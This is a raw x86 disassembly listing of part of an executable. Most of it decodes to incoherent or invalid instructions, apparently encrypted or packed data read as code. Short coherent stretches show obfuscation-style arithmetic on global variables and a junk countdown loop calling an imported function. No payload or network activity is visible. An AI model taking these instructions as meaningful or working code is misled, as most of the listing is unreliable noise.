  4119d5:	jbe    0x411990
  4119d7:	xchg   esp,eax
  4119d8:	push   0xfbdc5205
  4119dd:	xchg   esp,eax
  4119de:	imul   ebp,ebx,0x2b
  4119e1:	add    eax,0x5ba7c4da
  4119e6:	add    al,0x94
  4119e8:	and    BYTE PTR [ebp+ecx*2+0x2cc6a43b],dh
  4119ef:	add    al,0x47
  4119f1:	icebp  
  4119f2:	cs in  al,dx
  4119f4:	dec    eax
  4119f5:	sub    eax,0x3e4a9271
  4119fa:	inc    esp
  4119fb:	mov    esp,0x2f51a032
  411a00:	int    0xb5
  411a02:	sahf   
  411a03:	push   0xffffff94
  411a05:	mov    ds:0x938634d2,al
  411a0a:	pop    esp
  411a0b:	mov    ch,0xaf
  411a0d:	fs push esi
  411a0f:	pushf  
  411a10:	retf   
  411a11:	push   ecx
  411a12:	mov    esp,0x80170f93
  411a17:	dec    BYTE PTR [ebx]
  411a19:	xlat   BYTE PTR ds:[ebx]
  411a1a:	iret   
  411a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a1c:	cmc    
  411a1d:	sahf   
  411a1e:	push   esp
  411a1f:	add    eax,0xdbc404bd
  411a24:	mov    esi,DWORD PTR [edi-0x5d]
  411a27:	jmp    0xd240:0x2976577a
  411a2e:	xchg   edx,eax
  411a2f:	mov    ch,BYTE PTR [edi+eiz*2-0x165318b]
  411a36:	fstp   DWORD PTR [esi+0x4b]
  411a39:	int    0x21
  411a3b:	gs mov dh,0x7a
  411a3e:	pop    esi
  411a3f:	jno    0x411a42
  411a41:	or     al,0xeb
  411a43:	sbb    al,al
  411a45:	pusha  
  411a46:	dec    esi
  411a47:	add    BYTE PTR [ebx+0x4e],bh
  411a4a:	loope  0x4119eb
  411a4c:	int    0x1c
  411a4e:	test   DWORD PTR [ebx],0xc4fc2c4b
  411a54:	mov    bh,0x2e
  411a56:	or     edx,DWORD PTR [ebx+0x1255210a]
  411a5c:	mov    ch,0xc
  411a5e:	fild   DWORD PTR [esi]
  411a60:	imul   ebx,DWORD PTR [esi-0x311eed2c],0x97bfad84
  411a6a:	mov    ebx,0xf34957ab
  411a6f:	xor    esp,ebp
  411a71:	inc    DWORD PTR [ebx+0x6f797f6]
  411a77:	and    BYTE PTR [edx-0xc],al
  411a7a:	inc    esp
  411a7b:	fisttp DWORD PTR [edi]
  411a7d:	leave  
  411a7e:	mov    ch,0x55
  411a80:	jns    0x411a90
  411a82:	mov    edx,0xd037b9c6
  411a87:	sar    DWORD PTR [edi+0x1a],1
  411a8a:	(bad)  
  411a8b:	rcl    BYTE PTR [eax],cl
  411a8d:	rol    eax,cl
  411a8f:	xchg   edi,eax
  411a90:	inc    ecx
  411a91:	retf   0x1078
  411a94:	xchg   esp,eax
  411a95:	dec    ecx
  411a96:	sbb    BYTE PTR [eax+0x78631a70],dl
  411a9c:	jnp    0x411ab5
  411a9e:	lock push esi
  411aa1:	inc    edx
  411aa2:	adc    BYTE PTR [ecx],dl
  411aa4:	sbb    eax,DWORD PTR [ecx+0x20]
  411aa7:	jle    0x411a40
  411aa9:	mov    ecx,0xdd59be74
  411aae:	call   0x4d173c9e
  411ab3:	cmc    
  411ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ab5:	xchg   ebp,eax
  411ab6:	sbb    al,BYTE PTR [ebp+0x21f7a4d4]
  411abc:	mov    eax,ds:0x179399d6
  411ac1:	fisttp DWORD PTR [esi*1-0x48bfe01b]
  411ac8:	in     eax,dx
  411ac9:	fcomp  QWORD PTR ds:0x6c0e2f9b
  411acf:	or     BYTE PTR [ebp+0x11],ah
  411ad2:	daa    
  411ad3:	push   esp
  411ad4:	shr    BYTE PTR [edx],1
  411ad6:	(bad)  
  411ad7:	(bad)  [ecx+0x78]
  411ada:	ins    BYTE PTR es:[edi],dx
  411adb:	popf   
  411adc:	jmp    0x411b44
  411ade:	pusha  
  411adf:	shr    eax,0xcf
  411ae2:	fprem1 
  411ae4:	call   0x6def:0xb835fec5
  411aeb:	xor    DWORD PTR [ecx-0x3c],0xffffffcc
  411aef:	adc    eax,eax
  411af1:	(bad)  
  411af2:	mov    al,ds:0x33585d2b
  411af7:	loope  0x411b4d
  411af9:	or     eax,0x42614546
  411afe:	jmp    0x411b4b
  411b00:	mov    ch,0x2
  411b02:	dec    esi
  411b03:	push   esp
  411b04:	mov    dl,0x68
  411b06:	mov    ch,0x7d
  411b08:	push   ebx
  411b09:	outs   dx,DWORD PTR ds:[esi]
  411b0a:	scas   al,BYTE PTR es:[edi]
  411b0b:	inc    ecx
  411b0c:	adc    al,0xf0
  411b0e:	inc    edx
  411b0f:	mov    eax,ds:0xeaa8edd2
  411b14:	lock and DWORD PTR [esi+0x11327e84],eax
  411b1b:	call   0x84b4:0x8c4a63da
  411b22:	(bad)
  411b25:	and    BYTE PTR [ebx],ah
  411b27:	add    bh,cl
  411b29:	addr16 sti 
  411b2b:	fcomp  DWORD PTR [ebp+eiz*8-0x4b]
  411b2f:	cmp    bl,BYTE PTR [ebx-0x7a]
  411b32:	push   ds
  411b33:	nop
  411b34:	test   eax,0xeb966b99
  411b39:	jle    0x411ae1
  411b3b:	adc    DWORD PTR [ebx],0xffffffc2
  411b3e:	ret    0x9c80
  411b41:	adc    DWORD PTR ds:0xeb203efa,0xfdab934b
  411b4b:	mov    bh,0x51
  411b4d:	mov    esi,DWORD PTR [ecx-0x77]
  411b50:	pop    ds
  411b51:	xor    eax,0xbfc8e8d6
  411b56:	scas   al,BYTE PTR es:[edi]
  411b57:	push   esi
  411b58:	jo     0x411b00
  411b5a:	sar    DWORD PTR [ebx-0x3b],cl
  411b5d:	fnstsw WORD PTR [eax-0x107252c3]
  411b63:	mov    bl,0x8c
  411b65:	xchg   esp,eax
  411b66:	pop    eax
  411b67:	mov    BYTE PTR [edi],bl
  411b69:	add    BYTE PTR [edx],0x85
  411b6c:	pop    eax
  411b6d:	mov    ds:0x79ffe8ba,eax
  411b72:	sahf   
  411b73:	and    dl,dl
  411b75:	and    eax,0xa65ac0f9
  411b7a:	push   eax
  411b7b:	inc    edi
  411b7c:	pop    ds
  411b7d:	inc    bx
  411b7f:	and    dh,dh
  411b81:	xchg   BYTE PTR [edx+0x1b],bl
  411b84:	in     eax,dx
  411b85:	call   0x9b491af5
  411b8a:	xor    al,0x3d
  411b8c:	dec    esi
  411b8d:	ss jle 0x411be4
  411b90:	add    BYTE PTR [ecx],0x45
  411b93:	neg    bh
  411b95:	or     eax,0xc6ccaf68
  411b9a:	mov    edi,0x73817cb1
  411b9f:	push   ebx
  411ba0:	sbb    ecx,ebx
  411ba2:	loopne 0x411be7
  411ba4:	fnstenv [esi-0x79]
  411ba7:	pop    ss
  411ba8:	clc    
  411ba9:	inc    esi
  411baa:	nop
  411bab:	jb     0x411b50
  411bad:	mov    dl,0x18
  411baf:	inc    eax
  411bb0:	add    BYTE PTR [edi+0x42ea00ca],bl
  411bb6:	rol    dh,0xc2
  411bb9:	xchg   BYTE PTR [eax-0x5dd8b644],al
  411bbf:	and    DWORD PTR [ebp+0x43f6946f],edx
  411bc5:	push   esp
  411bc6:	test   al,0x1
  411bc8:	cmp    BYTE PTR [ecx],dh
  411bca:	inc    edi
  411bcb:	jmp    0x411bb0
  411bcd:	sub    BYTE PTR [edi],bl
  411bcf:	push   cs
  411bd0:	mov    al,0xcb
  411bd2:	stos   DWORD PTR es:[edi],eax
  411bd3:	cli    
  411bd4:	sbb    al,0x15
  411bd6:	sub    DWORD PTR [ecx+edi*8],edi
  411bd9:	push   0xe3fb4867
  411bde:	inc    eax
  411bdf:	pop    edi
  411be0:	dec    edx
  411be1:	sbb    BYTE PTR [eiz*1-0x196bb621],cl
  411be8:	shr    DWORD PTR [edi],0xe3
  411beb:	sbb    dl,BYTE PTR [ebx]
  411bed:	out    0xcc,eax
  411bef:	dec    ecx
  411bf0:	call   0xf855a72
  411bf5:	inc    edi
  411bf6:	setnp  BYTE PTR [eax]
  411bf9:	sub    DWORD PTR [edi+esi*8],edx
  411bfc:	div    BYTE PTR [eax-0x23]
  411bff:	or     al,0x9c
  411c01:	dec    ebx
  411c02:	scas   al,BYTE PTR es:[edi]
  411c03:	not    DWORD PTR [ebx+eax*8-0x7b]
  411c07:	push   0x8fb37982
  411c0c:	jb     0x411c88
  411c0e:	inc    esi
  411c0f:	int3   
  411c10:	inc    ecx
  411c11:	pop    edx
  411c12:	mov    bl,0xad
  411c14:	mov    WORD PTR [ebx+0x3ce7d767],?
  411c1a:	clc    
  411c1b:	xor    DWORD PTR [edx],0xa47475d4
  411c21:	not    DWORD PTR [edx]
  411c23:	push   ecx
  411c24:	jno    0x411bac
  411c26:	xor    BYTE PTR [ebp-0x7ba17604],ch
  411c2c:	and    BYTE PTR [esi],dh
  411c2e:	mul    BYTE PTR [edx+edi*4+0x34f4f5d9]
  411c35:	outs   dx,BYTE PTR ds:[esi]
  411c36:	je     0x411c43
  411c38:	je     0x411bbe
  411c3a:	jle    0x411bfd
  411c3c:	dec    edi
  411c3d:	aas    
  411c3e:	jno    0x411ca7
  411c40:	adc    DWORD PTR ds:0xbcd05c09,0x94ac031b
  411c4a:	pop    edx
  411c4b:	and    eax,edx
  411c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c4e:	sar    DWORD PTR [edx-0x11f3208f],0xd1
  411c55:	popf   
  411c56:	cli    
  411c57:	inc    edi
  411c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c59:	pop    es
  411c5a:	jae    0x411cad
  411c5c:	xor    BYTE PTR [esi+0x71],bl
  411c5f:	push   ebp
  411c60:	pop    edx
  411c61:	add    eax,0xafdc0606
  411c66:	ja     0x411c82
  411c68:	adc    dh,BYTE PTR [edi]
  411c6a:	sbb    dh,bh
  411c6c:	cmc    
  411c6d:	mov    eax,ds:0x41b22c
  411c72:	add    eax,DWORD PTR ds:0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x1dba7d5e
  411cb8:	mov    edx,0x7070535e
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411d23
  411cc2:	or     eax,0x904b7292
  411cc7:	mov    WORD PTR [edx*1-0x78ca1a2],?
  411cce:	(bad)  
  411ccf:	cmp    DWORD PTR [ebx+0x3a],esp
  411cd2:	push   esi
  411cd3:	fwait
  411cd4:	ret    0x42f5
  411cd7:	inc    eax
  411cd8:	mul    DWORD PTR [esi-0x10]
  411cdb:	and    DWORD PTR [edx+0x3cc8cb04],eax
  411ce1:	xchg   ecx,eax
  411ce2:	(bad)  
  411ce3:	jb     0x411cf2
  411ce5:	ja     0x411d1d
  411ce7:	jmp    0x404f8472
  411cec:	repz (bad) 
  411cee:	sub    eax,DWORD PTR [eax-0x5e1221b5]
  411cf4:	sub    al,BYTE PTR [ebp-0x3a1bc9f5]
  411cfa:	imul   ecx,DWORD PTR [ebx],0x41956a7
  411d00:	ss xchg esp,eax
  411d02:	jo     0x411d3b
  411d04:	mov    dh,0x82
  411d06:	jae    0x411cd3
  411d08:	out    0x43,eax
  411d0a:	leave  
  411d0b:	jmp    0xf01573d6
  411d10:	cld    
  411d11:	lods   al,BYTE PTR ds:[esi]
  411d12:	(bad)  
  411d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d14:	xchg   ah,dh
  411d16:	jo     0x411cdd
  411d18:	sub    edx,DWORD PTR [eax]
  411d1a:	test   DWORD PTR [ecx],ecx
  411d1c:	fsubrp st(5),st
  411d1e:	xor    al,0x7
  411d20:	xor    BYTE PTR [edx+0x20],0xe
  411d24:	pushf  
  411d25:	push   ss
  411d26:	and    eax,0x36af6464
  411d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d2c:	sar    DWORD PTR [edx-0x1e],1
  411d2f:	popf   
  411d30:	div    DWORD PTR [edx]
  411d32:	xor    BYTE PTR [edi-0x48f2e5da],0x32
  411d39:	and    edi,DWORD PTR [ebp+0x18]
  411d3c:	or     al,0xcc
  411d3e:	(bad)  
  411d3f:	aaa    
  411d40:	out    0x7c,al
  411d42:	ds stc 
  411d44:	or     al,0xf4
  411d46:	std    
  411d47:	mov    edx,0xa8cd45a5
  411d4c:	jp     0x411cfd
  411d4e:	cli    
  411d4f:	mov    esp,0xb4c125cd
  411d54:	pop    ebx
  411d55:	adc    esp,ebx
  411d57:	adc    BYTE PTR [esi+0x33],bl
  411d5a:	pop    edx
  411d5b:	fadd   DWORD PTR [eax]
  411d5d:	retf   
  411d5e:	ret    0x6b0c
  411d61:	pop    ebp
  411d62:	mov    eax,0x8cd72a4f
  411d67:	or     eax,0x8ea8950f
  411d6c:	inc    eax
  411d6d:	push   esi
  411d6e:	sar    DWORD PTR [ecx+0x3a],0x99
  411d72:	pop    ebp
  411d73:	fwait
  411d74:	add    ebx,ecx
  411d76:	mov    ah,0x83
  411d78:	aad    0xd6
  411d7a:	inc    ecx
  411d7b:	cmp    al,cl
  411d7d:	pop    eax
  411d7e:	mov    BYTE PTR [edx],0x1b
  411d81:	jmp    0x411d91
  411d83:	ins    BYTE PTR es:[edi],dx
  411d84:	cwde   
  411d85:	test   DWORD PTR [ebx],ebx
  411d87:	je     0x411d70
  411d89:	(bad)  
  411d8a:	push   ebx
  411d8b:	and    ecx,DWORD PTR [ecx+0x1cc2addb]
  411d91:	stos   DWORD PTR es:[edi],eax
  411d92:	fld    DWORD PTR [edi-0x4c]
  411d95:	fwait
  411d96:	xchg   esp,eax
  411d97:	pop    ecx
  411d98:	dec    ebx
  411d99:	cmp    BYTE PTR [eax+ecx*2+0x7074f29e],ch
  411da0:	xchg   edx,eax
  411da1:	stos   BYTE PTR es:[edi],al
  411da2:	sbb    esp,edx
  411da4:	pop    es
  411da5:	jecxz  0x411d72
  411da7:	jmp    FWORD PTR ds:0xee47f113
  411dad:	(bad)  
  411dae:	out    dx,al
  411daf:	(bad)  
  411db0:	xchg   ecx,eax
  411db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411db2:	int    0xbf
  411db4:	jbe    0x411d71
  411db6:	or     ebp,eax
  411db8:	sbb    BYTE PTR [esi+0x3e],0x70
  411dbc:	jle    0x411d67
  411dbe:	lock nop
  411dc0:	jmp    DWORD PTR [edi+ebx*2+0x35]
  411dc4:	fild   DWORD PTR [ecx]
  411dc6:	lock fwait
  411dc8:	cmp    ch,BYTE PTR [esi]
  411dca:	in     al,dx
  411dcb:	sub    ebp,0x3adc0c72
  411dd1:	inc    esi
  411dd2:	ror    DWORD PTR [eax-0x20],1
  411dd5:	inc    ecx
  411dd6:	sbb    dl,dl
  411dd8:	in     al,0x37
  411dda:	aas    
  411ddb:	rcr    DWORD PTR [edx+ebx*2-0x28],cl
  411ddf:	data16 loope 0x411e2a
  411de2:	ficom  WORD PTR [esi]
  411de4:	inc    ebp
  411de5:	fcomp  DWORD PTR [edx-0x5c9848f7]
  411deb:	jl     0x411dd4
  411ded:	jmp    0x411e31
  411def:	mov    ds:0x37a27fcf,eax
  411df4:	cs push ebx
  411df6:	inc    ebx
  411df7:	pushf  
  411df8:	mov    dh,0x3b
  411dfa:	mov    al,ds:0x4dd917a5
  411dff:	xchg   edx,eax
  411e00:	mov    ch,0x38
  411e02:	ret    0xb74e
  411e05:	jg     0x411e06
  411e07:	inc    ebp
  411e08:	sbb    BYTE PTR [ebx],dh
  411e0a:	fmul   QWORD PTR [eax]
  411e0c:	push   0x570312f8
  411e11:	jne    0x411d9e
  411e13:	sub    BYTE PTR [ebp+0x2ad4d5e7],0xfd
  411e1a:	jl     0x411e74
  411e1c:	adc    DWORD PTR [ebx+0x62],esi
  411e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e20:	std    
  411e21:	lahf   
  411e22:	push   ecx
  411e23:	inc    esi
  411e24:	test   eax,0xa93dcbc7
  411e29:	out    0x80,al
  411e2b:	xor    BYTE PTR [edx],dh
  411e2d:	(bad)  
  411e2e:	fstp   QWORD PTR [edx-0x24]
  411e31:	dec    esp
  411e32:	jno    0x411dc4
  411e34:	sub    DWORD PTR [esi+0x6b],edx
  411e37:	ret    0x43be
  411e3a:	cmp    bh,BYTE PTR [eax]
  411e3c:	mov    DWORD PTR [esi],esp
  411e3e:	(bad)  
  411e3f:	pusha  
  411e40:	mov    BYTE PTR [edx],cl
  411e42:	pop    esi
  411e43:	sbb    al,0xcd
  411e45:	inc    esi
  411e46:	jns    0x411e61
  411e48:	and    ch,dh
  411e4a:	out    dx,eax
  411e4b:	loopne 0x411e2a
  411e4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e4e:	jmp    0x411e4b
  411e50:	jmp    DWORD PTR [ecx+ebp*4-0x58ce8786]
  411e57:	dec    ebp
  411e58:	xor    cl,BYTE PTR [ecx-0x4d]
  411e5b:	and    edi,ebp
  411e5d:	jmp    0x8cb9e504
  411e62:	test   eax,0xe95fe4db
  411e67:	sbb    edi,DWORD PTR [ebp+0x57]
  411e6a:	mov    cl,0x5d
  411e6c:	not    bl
  411e6e:	dec    ebp
  411e6f:	adc    al,0x49
  411e71:	and    edx,DWORD PTR [esp+edx*4+0x66]
  411e75:	shl    BYTE PTR [edi],0x88
  411e78:	dec    ebp
  411e79:	adc    DWORD PTR [ecx],eax
  411e7b:	aas    
  411e7c:	repz xor BYTE PTR [edi],bl
  411e7f:	sub    BYTE PTR [edi-0xd],bh
  411e82:	lds    ebp,FWORD PTR [ecx+0x32a3474c]
  411e88:	adc    BYTE PTR [edx],bh
  411e8a:	mov    WORD PTR [edx-0x3f],ds
  411e8d:	or     al,0x45
  411e8f:	push   ebp
  411e90:	adc    eax,0x6f9e9766
  411e95:	jbe    0x411e54
  411e97:	retf   0x58d0
  411e9a:	pop    es
  411e9b:	jp     0x411ef1
  411e9d:	cs retf 
  411e9f:	fs ins DWORD PTR es:[edi],dx
  411ea1:	mov    al,ds:0xdd12a049
  411ea6:	adc    DWORD PTR [eax],ebx
  411ea8:	retf   0xf384
  411eab:	push   edx
  411eac:	xor    eax,0xda795efd
  411eb1:	fld    DWORD PTR [ebx]
  411eb3:	or     ah,BYTE PTR [edi]
  411eb5:	mov    al,0xb9
  411eb7:	out    0x53,al
  411eb9:	adc    BYTE PTR ds:0x6059bd9,0x72
  411ec0:	mov    esi,0xcd72d466
  411ec5:	imul   ebp,DWORD PTR [edx+0x1728f135],0x7e328d82
  411ecf:	fwait
  411ed0:	aam    0x77
  411ed2:	mov    dl,0x49
  411ed4:	mov    eax,0x2c4931cc
  411ed9:	mov    ah,BYTE PTR [ebp+0x3ab5a4da]
  411edf:	xchg   BYTE PTR [ecx],dh
  411ee1:	xor    eax,0x79741c5a
  411ee6:	shr    DWORD PTR [ebx+eax*1-0x4f],cl
  411eea:	adc    al,0x7
  411eec:	and    edi,DWORD PTR [edx+0x1176f075]
  411ef2:	std    
  411ef3:	fst    DWORD PTR [esi+0x48a07920]
  411ef9:	test   eax,0xcf379ec5
  411efe:	cwde   
  411eff:	imul   ecx,DWORD PTR [edi],0x2
  411f02:	jecxz  0x411ea7
  411f04:	aaa    
  411f05:	fsub   DWORD PTR [edx+0x1263f75c]
  411f0b:	mov    ch,0x1a
  411f0d:	loop   0x411f55
  411f0f:	in     eax,0xe8
  411f11:	mov    BYTE PTR [edi-0x1f43e8d9],dl
  411f17:	and    ecx,DWORD PTR [ebx-0x63]
  411f1a:	xor    DWORD PTR [edi],0xf8fd66d4
  411f20:	aas    
  411f21:	inc    ebp
  411f22:	test   BYTE PTR [ecx-0x5e9ecf99],ah
  411f28:	jmp    0xec0a5f1e
  411f2d:	das    
  411f2e:	cs call 0x7e72c8ce
  411f34:	les    ebp,FWORD PTR [edi+0x56]
  411f37:	imul   ecx,DWORD PTR [eax+0x427c07a9],0x7063c8c7
  411f41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f42:	aam    0xe
  411f44:	into   
  411f45:	jae    0x411f92
  411f47:	and    dl,BYTE PTR [ebp-0x4b3fb3d4]
  411f4d:	repnz xchg esp,eax
  411f4f:	push   es
  411f50:	mov    esi,0x7003a6bd
  411f55:	dec    eax
  411f56:	adc    al,BYTE PTR [ecx+0x23]
  411f59:	retf   0x220e
  411f5c:	xchg   ecx,eax
  411f5d:	mov    DWORD PTR [ecx+0x4e3457ba],esp
  411f63:	dec    eax
  411f64:	sub    ah,BYTE PTR [esi-0x3f]
  411f67:	in     al,0xb4
  411f69:	pop    edi
  411f6a:	lahf   
  411f6b:	cmp    BYTE PTR [ebx-0x2b],dh
  411f6e:	cmp    ebp,DWORD PTR [bp+di]
  411f71:	inc    esi
  411f72:	pushf  
  411f73:	(bad)  
  411f74:	adc    BYTE PTR [eax+0x70],0x1e
  411f78:	jae    0x411f65
  411f7a:	leave  
  411f7b:	mov    cl,dl
  411f7d:	sti    
  411f7e:	xstore-rng (bad)
  411f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f80:	xor    BYTE PTR [edx+0x3ec7d23e],0xb6
  411f87:	inc    edx
  411f88:	cmp    DWORD PTR [eax-0x560ce857],ecx
  411f8e:	sub    DWORD PTR fs:0x3aa1ba13,esi
  411f95:	sub    BYTE PTR [esp+ebx*8-0x7efaa861],cl
  411f9c:	loope  0x412009
  411f9e:	into   
  411f9f:	push   ebp
  411fa0:	imul   edi,DWORD PTR [ebx],0xca824772
  411fa6:	in     al,0xb6
  411fa8:	add    al,0x8
  411faa:	ss leave 
  411fac:	cmp    al,0x9f
  411fae:	jl     0x411f90
  411fb0:	pop    eax
  411fb1:	mov    esp,0xaf87d8df
  411fb6:	mov    dh,0x2a
  411fb8:	xchg   esi,eax
  411fb9:	jmp    0x411f4d
  411fbb:	or     cl,cl
  411fbd:	ret    
  411fbe:	idiv   DWORD PTR [ebx]
  411fc0:	adc    BYTE PTR [eax+ebp*8-0x17],bh
  411fc4:	mov    dl,0x51
  411fc6:	sub    al,BYTE PTR [edi-0x6b]
  411fc9:	sbb    BYTE PTR [ecx],bh
  411fcb:	aas    
  411fcc:	mov    al,ds:0x52e41802
  411fd1:	mov    ds:0x9adf559,al
  411fd6:	int3   
  411fd7:	push   eax
  411fd8:	mov    bl,0x9a
  411fda:	jg     0x411ff0
  411fdc:	(bad)  
  411fdd:	mov    bh,0xaf
  411fdf:	or     al,0xae
  411fe1:	pop    eax
  411fe2:	cmp    eax,DWORD PTR [ecx-0x28]
  411fe5:	pop    ebx
  411fe6:	xor    al,0xca
  411fe8:	in     al,0x1b
  411fea:	and    eax,0x7b82c52f
  411fef:	(bad)  
  411ff0:	dec    esi
  411ff1:	jno    0x411fee
  411ff3:	add    al,0xf6
  411ff5:	pop    esp
  411ff6:	stos   DWORD PTR es:[edi],eax
  411ff7:	adc    eax,edi
  411ff9:	cmc    
  411ffa:	in     eax,0x37
  411ffc:	into   
  411ffd:	mov    ecx,0x49af9dee
  412002:	int3   
  412003:	cmp    eax,0x7c3eac55
  412008:	rol    al,0xca
  41200b:	mov    dl,BYTE PTR [ecx-0x29]
  41200e:	jmp    0xf3ae9f64
  412013:	pushf  
  412014:	sbb    eax,DWORD PTR [eax]
  412016:	fadd   st(3),st
  412018:	mov    dl,0x13
  41201a:	frstor [ecx+0x79]
  41201d:	imul   ebx,DWORD PTR [eax],0x615c2da0
  412023:	(bad)  [esi+0x61]
  412026:	sbb    dh,BYTE PTR [edx-0x7fc77f6f]
  41202c:	shr    DWORD PTR [esi],cl
  41202e:	pop    esp
  41202f:	fs das 
  412031:	addr16 inc eax
  412033:	or     al,BYTE PTR [ebx+esi*2+0x77]
  412037:	sub    DWORD PTR [ecx],esp
  412039:	outs   dx,BYTE PTR ds:[esi]
  41203a:	and    BYTE PTR [ebx+0xa407237],0xd8
  412041:	add    eax,0x5c86f4b3
  412046:	das    
  412047:	mov    eax,DWORD PTR [ebp+0xada7177]
  41204d:	mov    ds:0x6a544aad,al
  412052:	xchg   edx,eax
  412053:	pop    ebp
  412054:	or     BYTE PTR ds:0xdb0abc54,bl
  41205a:	clc    
  41205b:	and    al,0xd1
  41205d:	mov    esp,0x360f7904
  412062:	test   eax,0xede77d8f
  412067:	nop
  412068:	inc    BYTE PTR [esi+eax*4]
  41206b:	and    al,0xdb
  41206d:	xchg   ebx,eax
  41206e:	cmp    DWORD PTR [edi-0x2d],0x526d18ea
  412075:	je     0x4120cc
  412077:	imul   esi,edi,0x77f0815a
  41207d:	xchg   ebx,eax
  41207e:	fist   WORD PTR [ebx]
  412080:	cmp    ah,BYTE PTR [eax]
  412082:	xchg   ecx,eax
  412083:	sbb    ah,bh
  412085:	in     eax,dx
  412086:	ins    DWORD PTR es:[edi],dx
  412087:	xchg   esp,eax
  412088:	adc    al,bl
  41208a:	outs   dx,DWORD PTR ds:[esi]
  41208b:	aam    0xcf
  41208d:	jg     0x412109
  41208f:	hlt    
  412090:	int3   
  412091:	adc    eax,0x9cc743d5
  412096:	retf   0x8932
  412099:	scas   eax,DWORD PTR es:[edi]
  41209a:	and    esp,0xc4cfaa3b
  4120a0:	pop    ebx
  4120a1:	push   ds
  4120a2:	in     al,dx
  4120a3:	push   edx
  4120a4:	mov    ecx,0x9316b4a7
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fdf6
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fd55
  4120d3:	adc    DWORD PTR ds:0x42e76f,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e76b,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e783,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e77b,0x19
  412102:	cmp    DWORD PTR ds:0x42e77b,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e77b,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fdfe
  412121:	push   0x0
  412123:	push   0x42e2ed
  412128:	call   DWORD PTR ds:0x42e503
  41212e:	mov    ebx,DWORD PTR ds:0x42e77b
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e77b,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e1a0,0x42fd81
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	imul   esp,DWORD PTR [ecx+ecx*2+0x705f4678],0x707eb970
  412178:	jo     0x412105
  41217a:	push   esp
  41217b:	(bad)  
  41217c:	pop    ecx
  41217d:	repnz test DWORD PTR [eax-0x4],ebx
  412181:	mov    ch,0x76
  412183:	or     cl,BYTE PTR [edi+0x47d348d8]
  412189:	jbe    0x412149
  41218b:	xor    eax,0xa63034c6
  412190:	xchg   esi,eax
  412191:	repz dec eax
  412193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412194:	clc    
  412195:	xor    al,0x2c
  412197:	cmp    edi,DWORD PTR [ecx+0x36a27848]
  41219d:	jg     0x412162
  41219f:	push   ecx
  4121a0:	nop
  4121a1:	ins    BYTE PTR es:[edi],dx
  4121a2:	sbb    eax,0x9d68a18f
  4121a7:	mov    dh,0x1e
  4121a9:	bound  eax,QWORD PTR [esi-0x79925b4b]
  4121af:	xor    eax,0xcfcefc60
  4121b4:	mov    ah,0x95
  4121b6:	push   ds
  4121b7:	push   ecx
  4121b8:	shl    BYTE PTR [ecx-0x28],0xd1
  4121bc:	push   ds
  4121bd:	push   ss
  4121be:	inc    edx
  4121bf:	xchg   edx,eax
  4121c0:	add    ecx,ebp
  4121c2:	imul   edi,DWORD PTR [ecx],0xb2769008
  4121c8:	mov    edi,0xb80d85d7
  4121cd:	in     al,0x33
  4121cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121d0:	pop    edi
  4121d1:	sub    cl,ch
  4121d3:	in     eax,dx
  4121d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121d5:	mov    esi,0x1b8b4491
  4121da:	mov    ebx,0x6aa71030
  4121df:	pop    esp
  4121e0:	ds (bad) 
  4121e2:	mov    BYTE PTR [edi-0x247d50b9],dl
  4121e8:	enter  0x6112,0x2d
  4121ec:	mov    bh,0xd5
  4121ee:	and    dh,BYTE PTR [ebx]
  4121f0:	in     eax,0x33
  4121f2:	or     al,0x37
  4121f4:	retf   
  4121f5:	fnsave [edi-0x11228abb]
